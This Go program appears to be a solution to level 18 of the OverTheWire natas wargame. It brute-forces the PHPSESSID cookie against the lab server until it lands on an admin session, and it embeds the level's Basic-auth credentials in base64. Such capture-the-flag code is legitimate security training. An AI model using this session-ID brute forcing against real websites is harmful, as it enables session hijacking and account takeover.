package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

const (
	rootUrl    = "http://natas18.natas.labs.overthewire.org/index.php?debug=1"
	successStr = "You are an admin"
)

func main() {
	n := 115
	b := []byte{}
	reg := regexp.MustCompile(fmt.Sprintf(".*%s.*", successStr))

	//log.Fatal(reg.Match([]byte("Wtf is this<h1>You an admin")))

	for !reg.Match(b) || n > 640 {
		data := &url.Values{}
		data.Set("username", "admin")
		data.Set("password", "admin")

		c := http.Client{}

		req, err := http.NewRequest(http.MethodPost, rootUrl, strings.NewReader(data.Encode()))
		if err != nil {
			log.Fatal(err)
		}
		req.Header.Add("Authorization", "Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==")
		req.Header.Add("Cookie", fmt.Sprintf("PHPSESSID=%d;", n))

		res, err := c.Do(req)
		if err != nil {
			log.Fatal(err)
		}

		defer res.Body.Close()

		b, err = io.ReadAll(res.Body)
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Not found => %d", n)
		n += 1
		time.Sleep(300 * time.Millisecond)
	}

	log.Printf("Found => %d", n)
	log.Println(string(b))
}
